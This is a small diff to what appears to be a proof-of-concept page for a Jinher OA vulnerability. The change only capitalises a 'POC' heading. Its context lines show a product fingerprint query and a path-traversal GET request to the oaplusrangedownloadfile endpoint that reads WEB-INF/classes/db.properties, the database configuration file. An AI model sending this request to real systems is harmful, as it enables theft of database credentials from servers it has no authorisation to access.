@@ -8,7 +8,7 @@
 app="Jinher-OA"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /jc6/JHSoft.WCF/login/oaplusrangedownloadfile?filename=../WEB-INF/classes/db.properties HTTP/1.1
